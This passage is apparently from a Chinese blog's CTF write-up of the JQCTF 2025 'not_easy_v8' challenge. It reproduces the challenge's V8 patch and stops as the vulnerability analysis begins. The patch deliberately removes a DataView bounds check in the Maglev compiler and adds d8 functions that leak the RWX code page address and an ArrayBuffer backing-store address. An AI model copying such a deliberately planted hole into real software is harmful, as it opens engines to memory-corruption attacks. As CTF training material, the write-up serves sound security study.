@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="写在最前面为什么要写这篇博客呢，因为这是笔者第一次在比赛上拿到 v8 的一血，所以纪念一下🤣。也许有人会问，一血不是 NeSE 嘛？确实，在排行榜上一血确实是他们，但是我并没有去参加决赛，附件也是找别人要的，当我打通别人给的远程后才发现这题还没有人做出来       但不得不说，这题 v8 也非常的简单，基本是会 v8 的人都能够直接秒 :)   信息收集这里先给出 patch 文件 patch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp">
+<meta property="og:url" content="https://qanux.github.io/2025/07/27/not_easy_v8/index.html">
+<meta property="og:site_name" content="Qanux&#39;s space">
+<meta property="og:description" content="写在最前面为什么要写这篇博客呢，因为这是笔者第一次在比赛上拿到 v8 的一血，所以纪念一下🤣。也许有人会问，一血不是 NeSE 嘛？确实，在排行榜上一血确实是他们，但是我并没有去参加决赛，附件也是找别人要的，当我打通别人给的远程后才发现这题还没有人做出来       但不得不说，这题 v8 也非常的简单，基本是会 v8 的人都能够直接秒 :)   信息收集这里先给出 patch 文件 patch">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://qanux.github.io/2025/07/27/not_easy_v8/1.png">
+<meta property="og:image" content="https://qanux.github.io/2025/07/27/not_easy_v8/2.png">
+<meta property="article:published_time" content="2025-07-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-27T14:15:24.752Z">
+<meta property="article:author" content="Qanux">
+<meta property="article:tag" content="CsomePro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qanux.github.io/2025/07/27/not_easy_v8/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp</title>
+    <!-- async scripts -->
+    <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+    
+    
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/friend/">Link</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/24/ebpf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/07/27/not_easy_v8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/07/27/not_easy_v8/&text=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/07/27/not_easy_v8/&is_video=false&description=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp&body=Check out this article: https://qanux.github.io/2025/07/27/not_easy_v8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/07/27/not_easy_v8/&title=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/07/27/not_easy_v8/&name=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/07/27/not_easy_v8/&t=JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">写在最后</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JQCTF 2025 Final not_easy_v8 &#39;first blood&#39; wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Qanux</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-26T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-07-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>为什么要写这篇博客呢，因为这是笔者第一次在比赛上拿到 v8 的一血，所以纪念一下🤣。也许有人会问，一血不是 NeSE 嘛？确实，在排行榜上一血确实是他们，但是我并没有去参加决赛，附件也是找别人要的，当我打通别人给的远程后才发现这题还没有人做出来  </p>
+<img src="/2025/07/27/not_easy_v8/1.png" class="" title="我的图图呢">  
+
+<p>但不得不说，这题 v8 也非常的简单，基本是会 v8 的人都能够直接秒 :)  </p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里先给出 patch 文件</p>
+<p><strong>patch.diff</strong></p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index 65d716745d1..bce2e5f6dc0 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3776,6 +3776,44 @@</span> void Shell::Version(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span><br><span class="line">           .ToLocalChecked());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+void Shell::Jing(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+  i::Isolate* i_isolate = reinterpret_cast&lt;i::Isolate*&gt;(isolate);</span></span><br><span class="line"><span class="addition">+  auto rwx_page = i_isolate-&gt;heap()-&gt;code_space()-&gt;first_page();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if(rwx_page != NULL) &#123;</span></span><br><span class="line"><span class="addition">+    i::Address rwx_addr = rwx_page-&gt;area_start();</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(v8::BigInt::NewFromUnsigned(isolate, rwx_addr));</span></span><br><span class="line"><span class="addition">+  &#125; else &#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(Undefined(isolate));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void Shell::Qi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+  HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if(info.Length() &lt; 1) &#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(Undefined(isolate));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  v8::Local&lt;v8::Value&gt; arg = info[0];</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!arg-&gt;IsArrayBuffer()) &#123;</span></span><br><span class="line"><span class="addition">+    info.GetReturnValue().Set(Undefined(isolate));</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  v8::Local&lt;v8::ArrayBuffer&gt; buffer = arg.As&lt;v8::ArrayBuffer&gt;();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  std::shared_ptr&lt;v8::BackingStore&gt; backing_store = buffer-&gt;GetBackingStore();</span></span><br><span class="line"><span class="addition">+  void* data_ptr = backing_store-&gt;Data();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // 将指针转换为一个整数，以便创建 BigInt</span></span><br><span class="line"><span class="addition">+  uintptr_t address_value = reinterpret_cast&lt;uintptr_t&gt;(data_ptr);</span></span><br><span class="line"><span class="addition">+  v8::Local&lt;v8::BigInt&gt; result = v8::BigInt::NewFromUnsigned(isolate, address_value);</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(result);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> void Shell::ReportException(Isolate* isolate, Local&lt;v8::Message&gt; message,</span><br><span class="line">                             Local&lt;v8::Value&gt; exception_obj) &#123;</span><br><span class="line">   HandleScope handle_scope(isolate);</span><br><span class="line"><span class="meta">@@ -4018,51 +4056,55 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="deletion">-                       String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;version&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, Version));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;Jing&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, Jing));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;Qi&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, Qi));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="addition">+//                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;version&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, Version));</span></span><br><span class="line"> </span><br><span class="line">   global_template-&gt;Set(isolate, &quot;print&quot;, FunctionTemplate::New(isolate, Print));</span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;printErr&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, PrintErr));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;write&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, WriteStdout));</span></span><br><span class="line"><span class="deletion">-  if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span></span><br><span class="line"><span class="deletion">-                         FunctionTemplate::New(isolate, WriteFile));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;read&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadFile));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadBuffer));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadLine));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;load&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line"><span class="deletion">-  // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span></span><br><span class="line"><span class="deletion">-  // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span></span><br><span class="line"><span class="deletion">-  // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span></span><br><span class="line"><span class="deletion">-  if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;performance&quot;,</span></span><br><span class="line"><span class="deletion">-                       Shell::CreatePerformanceTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-  // Prevent fuzzers from creating side effects.</span></span><br><span class="line"><span class="deletion">-  if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-  if (i::v8_flags.expose_async_hooks) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span><br><span class="line"><span class="deletion">-                         Shell::CreateAsyncHookTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;printErr&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, PrintErr));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;write&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, WriteStdout));</span></span><br><span class="line"><span class="addition">+//   if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="addition">+//     global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span></span><br><span class="line"><span class="addition">+//                          FunctionTemplate::New(isolate, WriteFile));</span></span><br><span class="line"><span class="addition">+//   &#125;</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;read&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, ReadFile));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, ReadBuffer));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, ReadLine));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;load&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span></span><br><span class="line"><span class="addition">+//                        FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line"><span class="addition">+//   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span></span><br><span class="line"><span class="addition">+//   // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span></span><br><span class="line"><span class="addition">+//   // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span></span><br><span class="line"><span class="addition">+//   if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="addition">+//     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span><br><span class="line"><span class="addition">+//   &#125;</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;performance&quot;,</span></span><br><span class="line"><span class="addition">+//                        Shell::CreatePerformanceTemplate(isolate));</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+//   // Prevent fuzzers from creating side effects.</span></span><br><span class="line"><span class="addition">+//   if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="addition">+//     global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span></span><br><span class="line"><span class="addition">+//   &#125;</span></span><br><span class="line"><span class="addition">+//   global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+//   if (i::v8_flags.expose_async_hooks) &#123;</span></span><br><span class="line"><span class="addition">+//     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span><br><span class="line"><span class="addition">+//                          Shell::CreateAsyncHookTemplate(isolate));</span></span><br><span class="line"><span class="addition">+//   &#125;</span></span><br><span class="line"> </span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.h b/src/d8/d8.h</span></span><br><span class="line"><span class="comment">index 94dcfb5a23d..4721121688d 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.h</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.h</span></span><br><span class="line"><span class="meta">@@ -657,6 +657,8 @@</span> class Shell : public i::AllStatic &#123;</span><br><span class="line">   static void ScheduleTermination(</span><br><span class="line">       const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span><br><span class="line">   static void Version(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span><br><span class="line"><span class="addition">+  static void Jing(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span></span><br><span class="line"><span class="addition">+  static void Qi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span></span><br><span class="line">   static void WriteFile(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span><br><span class="line">   static void ReadFile(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);</span><br><span class="line">   static void CreateWasmMemoryMapDescriptor(</span><br><span class="line"><span class="comment">diff --git a/src/maglev/x64/maglev-ir-x64.cc b/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="comment">index ef1f9937105..4f3bbe6756f 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/x64/maglev-ir-x64.cc</span></span><br><span class="line"><span class="meta">@@ -113,7 +113,7 @@</span> void CheckJSDataViewBounds::GenerateCode(MaglevAssembler* masm,</span><br><span class="line">   int element_size = compiler::ExternalArrayElementSize(element_type_);</span><br><span class="line">   if (element_size &gt; 1) &#123;</span><br><span class="line">     __ subq(byte_length, Immediate(element_size - 1));</span><br><span class="line"><span class="deletion">-    __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);</span></span><br><span class="line"><span class="addition">+//     __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);</span></span><br><span class="line">   &#125;</span><br><span class="line">   __ cmpl(index, byte_length);</span><br><span class="line">   __ EmitEagerDeoptIf(above_equal, DeoptimizeReason::kOutOfBounds, this);</span><br></pre></td></tr></table></figure>
+
+<p>d8的版本是 14.0.0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">V8 version 14.0.0 (candidate)</span><br><span class="line">d8&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开启了指针压缩，但没有开那个最新版本的 sanbox  </p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞主要出现在下面个地方  </p>
